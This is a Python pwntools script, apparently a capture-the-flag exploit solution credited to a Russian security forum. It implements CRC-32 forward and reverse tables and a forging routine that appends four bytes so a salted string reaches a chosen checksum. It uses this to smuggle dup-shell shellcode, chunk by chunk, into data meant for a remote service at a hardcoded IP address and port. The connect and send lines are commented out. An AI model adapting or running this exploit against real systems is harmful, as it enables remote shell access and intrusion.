# https://rdot.org/forum/showthread.php?s=cdfb948132c4ae696255974aa11d760d&p=35851#post35851

from pwn import *
context('i386', 'linux', 'ipv4')

from struct import unpack, pack

#UI = lambda a : unpack('I', a)[0]
#PI = lambda a : pack('I', a)
 
# Poly in "reversed" notation -- http://en.wikipedia.org/wiki/Cyclic_redundancy_check
POLY = 0xedb88320 # CRC-32-IEEE 802.3
#POLY = 0x82F63B78 # CRC-32C (Castagnoli)
#POLY = 0xEB31D82E # CRC-32K (Koopman)
#POLY = 0xD5828281 # CRC-32Q
 
def build_crc_tables():
    for i in range(256):
        fwd = i
        rev = i << 24
        for j in range(8, 0, -1):
            # build normal table
            if (fwd & 1) == 1:
                fwd = (fwd >> 1) ^ POLY
            else:
                fwd >>= 1
            crc32_table[i] = fwd & 0xffffffff
            # build reverse table =)
            if rev & 0x80000000 == 0x80000000:
                rev = ((rev ^ POLY) << 1) | 1
            else:
                rev <<= 1
            rev &= 0xffffffff
            crc32_reverse[i] = rev
 
crc32_table, crc32_reverse = [0]*256, [0]*256
build_crc_tables()
 
def crc32(s): # same crc32 as in (binascii.crc32)&0xffffffff
  crc = 0xffffffff
  for c in s:
    crc = (crc >> 8) ^ crc32_table[(crc ^ ord(c)) & 0xff]
  return crc^0xffffffff
 
def forge(wanted_crc, str, pos=None):
  if pos is None:
    pos = len(str)
 
  # forward calculation of CRC up to pos, sets current forward CRC state
  fwd_crc = 0xffffffff
  for c in str[:pos]:
    fwd_crc = (fwd_crc >> 8) ^ crc32_table[(fwd_crc ^ ord(c)) & 0xff]
 
  # backward calculation of CRC up to pos, sets wanted backward CRC state
  bkd_crc = wanted_crc^0xffffffff
  for c in str[pos:][::-1]:
    bkd_crc = ((bkd_crc << 8)&0xffffffff) ^ crc32_reverse[bkd_crc >> 24] ^ ord(c)
 
  # deduce the 4 bytes we need to insert
  for c in pack('<L',fwd_crc)[::-1]:
    bkd_crc = ((bkd_crc << 8)&0xffffffff) ^ crc32_reverse[bkd_crc >> 24] ^ ord(c)
 
  res = str[:pos] + pack('<L', bkd_crc) + str[pos:]
  assert(crc32(res) == wanted_crc)
  return res


#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('54.178.232.195', 5757))
#salt = s.recv(128)[6:-1].decode('hex')
salt = '92a404a647511c0017ee'.decode('hex')
print 'SALT %s' % salt.encode('hex')

sc = asm(shellcode.dupsh(4)).ljust(36, '\x00')
t = p32(len(sc) / 4)
for i in xrange(0, len(sc), 4):
    r = forge(u32(sc[i:i + 4]), salt)
    print "scode: %08s / CRC Test: %28s / CRC Result: %s" % (sc[i:i + 4].encode('hex'), r.encode('hex'), p32(crc32(r)).encode('hex'))
    t += p32(4) + r[-4:]
#s.send(t + '\n')
#print s.recv(128)
